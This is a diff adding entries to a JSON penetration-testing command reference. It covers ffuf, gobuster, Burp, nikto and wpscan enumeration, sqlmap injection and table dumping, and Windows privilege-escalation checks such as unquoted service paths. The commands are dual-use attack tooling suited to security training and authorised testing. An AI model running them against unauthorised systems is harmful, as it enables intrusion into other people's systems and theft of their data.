+      "description": "Fuzzes the HTTP 'Host' header to discover subdomains or virtual hosts that are served by the same IP address but aren't publicly listed in DNS.",
+      "when_to_use": "Crucial when targeting a single IP that might host multiple internal applications (like 'dev.target.local' or 'admin.target.local') that route differently based on the requested Host header.",
+      "example": "ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://target.com -H \"Host: FUZZ.target.com\" -fs 1234",
+      "common_pitfalls": "You absolutely must use size filtering ('-fs') or word filtering ('-fw') here, because the default VHost will usually return a valid 200 response, flooding your results."
+    },
+    {
+      "id": "gobuster-dir",
+      "tool": "gobuster",
+      "category": "Web Enumeration",
+      "scenario_tags": [
+        "web",
+        "directory-bruteforce"
+      ],
+      "platform": "cross-platform",
+      "title": "Directory Brute-Forcing with Extensions",
+      "command": "gobuster dir -u http://<target> -w <wordlist> -x <extensions>",
+      "description": "A classic directory brute-forcing tool that allows you to easily append specific file extensions (like .php, .txt, .bak) to every wordlist entry during the scan.",
+      "when_to_use": "A solid alternative to ffuf when you want a simpler syntax for finding specific file types on a target web server.",
+      "example": "gobuster dir -u http://10.10.10.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak",
+      "related_ids": [
+        "ffuf-dir-fuzz"
+      ]
+    },
+    {
+      "id": "burp-proxy-setup",
+      "tool": "Burp Suite",
+      "category": "Web Enumeration",
+      "scenario_tags": [
+        "web",
+        "proxy",
+        "interception"
+      ],
+      "platform": "cross-platform",
+      "title": "Configure Proxy Interception",
+      "command": "FoxyProxy -> Burp (127.0.0.1:8080) | Burp: Proxy -> Intercept is on",
+      "description": "The fundamental setup for Burp Suite: routing your browser traffic through Burp's local proxy listener so you can pause, inspect, and modify HTTP requests before they reach the server.",
+      "when_to_use": "Mandatory for all manual web application testing. Use this to bypass client-side validation, analyze hidden API requests, or manipulate session cookies.",
+      "example": "N/A (GUI action)",
+      "common_pitfalls": "Forgetting to install PortSwigger's CA certificate in your browser, which will cause all HTTPS sites to throw severe security warnings."
+    },
+    {
+      "id": "burp-repeater",
+      "tool": "Burp Suite",
+      "category": "Web Enumeration",
+      "scenario_tags": [
+        "web",
+        "manual-testing",
+        "repeater"
+      ],
+      "platform": "cross-platform",
+      "title": "Send to Repeater (Shortcut)",
+      "command": "Ctrl + R (Windows/Linux) or Cmd + R (Mac)",
+      "description": "Quickly sends an intercepted HTTP request to the 'Repeater' tab. Repeater allows you to manually tweak parameters and replay the exact same request endlessly to observe the server's response.",
+      "when_to_use": "Use this constantly when probing an endpoint for vulnerabilities like SQL Injection, XSS, or IDOR, as it saves you from having to click through the actual website UI over and over.",
+      "example": "N/A (GUI action)"
+    },
+    {
+      "id": "nikto-basic",
+      "tool": "nikto",
+      "category": "Web Enumeration",
+      "scenario_tags": [
+        "web",
+        "vulnerability-scanning"
+      ],
+      "platform": "linux",
+      "title": "Basic Web Server Vulnerability Scan",
+      "command": "nikto -h <target>",
+      "description": "A classic, noisy web vulnerability scanner that checks web servers for thousands of outdated files, misconfigurations, and known insecure software versions.",
+      "when_to_use": "Run this in the background early in an engagement. While it generates many false positives, it excels at quickly identifying missing security headers, default index pages, or ancient server software.",
+      "example": "nikto -h http://10.10.10.20",
+      "common_pitfalls": "Extremely noisy and signature-heavy. It will light up a target's Intrusion Detection System instantly."
+    },
+    {
+      "id": "wpscan-enum",
+      "tool": "wpscan",
+      "category": "Web Enumeration",
+      "scenario_tags": [
+        "web",
+        "cms",
+        "wordpress"
+      ],
+      "platform": "linux",
+      "title": "Aggressive WordPress Enumeration",
+      "command": "wpscan --url <target> --enumerate vp,vt,u",
+      "description": "A specialized scanner for WordPress environments. This command specifically enumerates vulnerable plugins ('vp'), vulnerable themes ('vt'), and registered users ('u').",
+      "when_to_use": "The absolute first tool you should reach for whenever you detect a target is running WordPress. Identifying a vulnerable plugin is the most common path to compromising a WP site.",
+      "example": "wpscan --url http://blog.target.com --enumerate vp,vt,u --api-token <your_token>",
+      "common_pitfalls": "Without supplying a free Wpscan API token, the tool will enumerate the plugins but will NOT tell you if they have known vulnerabilities."
+    },
+    {
+      "id": "sqlmap-auto",
+      "tool": "sqlmap",
+      "category": "Web Enumeration",
+      "scenario_tags": [
+        "web",
+        "exploitation",
+        "sqli"
+      ],
+      "platform": "cross-platform",
+      "title": "Automated SQL Injection Testing",
+      "command": "sqlmap -u \"<target_url>\" --batch --dbs",
+      "description": "Automatically tests a URL parameter for SQL injection vulnerabilities. If successful, it exploits the flaw to list all databases ('--dbs') available on the backend server. The '--batch' flag accepts default prompts without user interaction.",
+      "when_to_use": "Use this when you suspect a URL parameter (e.g., '?id=1') or a POST body field is vulnerable to SQL injection, but you want to automate the tedious payload generation and database dumping process.",
+      "example": "sqlmap -u \"http://10.10.10.30/view.php?id=1\" --batch --dbs",
+      "common_pitfalls": "Can accidentally corrupt database records if testing against fragile production applications. Never run blindly against untested targets."
+    },
+    {
+      "id": "sqlmap-request-file",
+      "tool": "sqlmap",
+      "category": "Web Enumeration",
+      "scenario_tags": [
+        "web",
+        "exploitation",
+        "sqli",
+        "burp"
+      ],
+      "platform": "cross-platform",
+      "title": "SQLMap via Intercepted Request File",
+      "command": "sqlmap -r <request_file> -p <parameter> --dump",
+      "description": "Instructs SQLMap to parse a raw HTTP request saved to a text file (usually exported directly from Burp Suite) and target a specific parameter for injection, ultimately attempting to dump the tables.",
+      "when_to_use": "Crucial when the SQL injection is in a complex POST request, an authenticated session with specific cookies, or hidden within HTTP headers, which are difficult to supply via the command line.",
+      "example": "sqlmap -r login_request.txt -p username --dump"
+    },
+    {
+      "id": "win-cmd-whoami-priv",
+      "tool": "CMD",
+      "category": "Windows Privilege Escalation",
+      "scenario_tags": [
+        "windows",
+        "privesc",
+        "enumeration",
+        "cmd"
+      ],
+      "platform": "windows",
+      "title": "Check User Privileges (CMD)",
+      "command": "whoami /priv",
+      "description": "Lists the Windows security privileges assigned to the current user token. This is one of the most critical first steps in Windows enumeration.",
+      "when_to_use": "Run this immediately upon getting a shell. Look specifically for SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, or SeBackupPrivilege, which are common pathways to full SYSTEM compromise.",
+      "example": "whoami /priv",
+      "common_pitfalls": "Just because a privilege is listed does not mean it is currently 'Enabled'. However, an attacker can usually enable a listed privilege programmatically."
+    },
+    {
+      "id": "win-cmd-sysinfo",
+      "tool": "CMD",
+      "category": "Windows Privilege Escalation",
+      "scenario_tags": [
+        "windows",
+        "privesc",
+        "enumeration",
+        "cmd"
+      ],
+      "platform": "windows",
+      "title": "System Information & Hotfixes (CMD)",
+      "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"",
+      "description": "Extracts the core operating system details from the noisy output of 'systeminfo'. You can also search for applied hotfixes to identify missing kernel patches.",
+      "when_to_use": "Use this to determine the exact OS build number. You can then cross-reference this build with local exploit suggesters (like Windows-Exploit-Suggester) to find kernel exploits.",
+      "example": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
+      "related_ids": [
+        "win-ps-system-info"
+      ]
+    },
+    {
+      "id": "win-ps-system-info",
+      "tool": "PowerShell",
+      "category": "Windows Privilege Escalation",
+      "scenario_tags": [
+        "windows",
+        "privesc",
+        "enumeration",
+        "powershell"
+      ],
+      "platform": "windows",
+      "title": "Get OS Architecture & Details (PowerShell)",
+      "command": "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture",
+      "description": "The modern PowerShell equivalent for querying OS details using CIM instances, returning a clean, parseable object.",
+      "when_to_use": "Preferred over CMD's systeminfo when you have a stable PowerShell session and need precise object-oriented output without string parsing.",
+      "example": "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture"
+    },
+    {
+      "id": "win-cmd-net-users",
+      "tool": "CMD",
+      "category": "Windows Privilege Escalation",
+      "scenario_tags": [
+        "windows",
+        "privesc",
+        "enumeration",
+        "cmd"
+      ],
+      "platform": "windows",
+      "title": "List Local Users and Administrators",
+      "command": "net users\nnet localgroup administrators",
+      "description": "Displays all local user accounts on the machine, and then specifically lists the members of the powerful local 'Administrators' group.",
+      "when_to_use": "Crucial for understanding who has access to the machine. If your current user is in the Administrators group, you already have full control (but may need to bypass UAC).",
+      "example": "net localgroup administrators"
+    },
+    {
+      "id": "win-ps-get-acl",
+      "tool": "PowerShell",
+      "category": "Windows Privilege Escalation",
+      "scenario_tags": [
+        "windows",
+        "privesc",
+        "enumeration",
+        "powershell"
+      ],
+      "platform": "windows",
+      "title": "Check Folder Permissions (ACLs)",
+      "command": "Get-Acl -Path \"<target_path>\" | Format-List",
+      "description": "Retrieves the Access Control List (ACL) for a specific file or folder, detailing exactly which users or groups have Read, Write, or Execute permissions.",
+      "when_to_use": "Use this to check if your low-privileged user has write access to sensitive directories, such as 'C:\\Program Files\\', which is a primary requirement for DLL Hijacking or unquoted service path exploits.",
+      "example": "Get-Acl -Path \"C:\\Program Files\\VulnerableApp\" | Format-List",
+      "common_pitfalls": "PowerShell's native Get-Acl output can be difficult to interpret quickly. Tools like accesschk.exe are often preferred for readability if available."
+    },
+    {
+      "id": "win-winpeas-all",
+      "tool": "winPEAS",
+      "category": "Windows Privilege Escalation",
+      "scenario_tags": [
+        "windows",
+        "privesc",
+        "automation"
+      ],
+      "platform": "windows",
+      "title": "Run Full winPEAS Scan",
+      "command": ".\\winPEASany.exe quiet cmd fast",
+      "description": "Executes the Windows Privilege Escalation Awesome Scripts suite. It exhaustively searches the host for misconfigurations, hardcoded credentials, vulnerable services, and unpatched exploits.",
+      "when_to_use": "Run this after manual enumeration if nothing obvious stands out. It automates hundreds of checks in seconds.",
+      "example": ".\\winPEASany.exe quiet cmd fast > output.txt",
+      "common_pitfalls": "The output is extremely verbose and color-coded. If you redirect to a text file, the ANSI color codes will make it unreadable unless you use a compatible viewer or strip them.",
+      "related_ids": [
+        "linpeas-all"
+      ]
+    },
+    {
+      "id": "win-cmd-services",
+      "tool": "CMD",
+      "category": "Windows Privilege Escalation",
+      "scenario_tags": [
+        "windows",
+        "privesc",
+        "enumeration",
+        "services"
+      ],
+      "platform": "windows",
+      "title": "Query Unquoted Service Paths",
+      "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"",
+      "description": "Searches for services that start automatically, are located outside the secure Windows folder, and do NOT have quotes around their executable paths. This is the classic signature of an Unquoted Service Path vulnerability.",
+      "when_to_use": "A staple manual check. If an unquoted path contains a space (e.g., C:\\Program Files\\App\\run.exe), Windows might try to execute 'C:\\Program.exe' first. If you can write to the C:\\ drive, you can drop a malicious 'Program.exe' to intercept the service launch.",
+      "example": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\""
+    }
+  ]
+}
